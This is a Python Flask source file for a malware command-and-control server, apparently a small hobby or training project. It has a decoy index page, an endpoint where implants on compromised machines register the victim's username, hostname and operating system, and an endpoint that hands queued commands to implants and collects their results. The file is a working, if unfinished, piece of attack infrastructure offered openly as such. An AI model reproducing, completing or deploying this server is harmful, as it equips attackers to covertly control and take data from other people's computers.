from crypt import methods
from flask import Blueprint, jsonify, request
from speedrun.db import db
from speedrun.models import Implant, Task 

c2 = Blueprint('c2', __name__)



@c2.route("/index.html")
def hello_c2():
    return "Nothing to see here"


"""class Implant(db.Model):
    id =  db.Column(db.Integer, primary_key=True)
    implant_id = db.Column(db.String)
    username = db.Column(db.String),
    hostname = db.Column(db.String),
    os_type = db.Column(db.String),
    os_name =db.Column(db.String),
    os_version  = db.Column(db.String)
    """

def register_implant_helper(implant_id, username, hostname, os_type, os_name, os_version):
    # todo add error checking for these fields 
    implant = Implant(
        implant_id = implant_id, 
        username = username, 
        hostname = hostname, 
        os_type = os_type, 
        os_name = os_name, 
        os_version= os_version
    )
    print("A new agent was reigstered!", implant.implant_id)
    db.session.add(implant)
    db.session.commit()
    return implant.implant_id


@c2.route("/implant/register", methods=["POST"])
def register_implant():
    data = request.get_json()
    result = register_implant_helper(**data)

    # result = register_implant_helper(
    #     data.get("implant_id"), 
    #     data.get("username"),
    #     data.get("hostname"),
    #     data.get("os_type"),
    #     data.get("os_name"),
    #     data.get("os_version")
    # )
    if result:
        return jsonify({"status": True, "message": "welcome!"})
    else:
        return jsonify({"status": False, "message": "go away"})

@c2.route("/implant/task", methods=[ "POST"])
def handle_implant_task():
    data = request.get_json()
    results = data.get("results")
    if results:
        # TODO: update the database with the reuslts 
        print("We got results!", results)
    implant_id = data.get("implant_id")
    #Agent.query.filter_by(agent_id=id_).first()
    tasks = list(Task.query.filter_by(implant_id = implant_id).all())
    return jsonify(
        [{"cmd": i.cmd, "task_id": i.task_id, "args": i.args} for i in tasks]
    )

